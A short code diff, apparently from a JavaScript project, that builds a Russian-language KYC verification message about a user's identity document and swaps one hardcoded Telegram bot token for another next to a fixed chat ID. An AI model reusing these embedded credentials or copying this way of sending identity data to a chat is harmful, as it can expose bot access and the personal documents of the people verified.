@@ -138,7 +138,7 @@ ${kycData.documentPhoto ? '📸 Документ прикреплен' : '❌ Д
 #верификация #kyc #${kycData.country.toLowerCase().replace(' ', '_')}
       `.trim();
       
-      const botToken = '7769124785:AAE46Zt6jh9IPVt4IB4u0j8kgEVg2NpSYa0';
+      const botToken = '8312481233:AAH_CzfX314D_dbthhUBdZ5SoAzO3scrEu0';
       const chatId = '-1003560670670';
       
       let response;
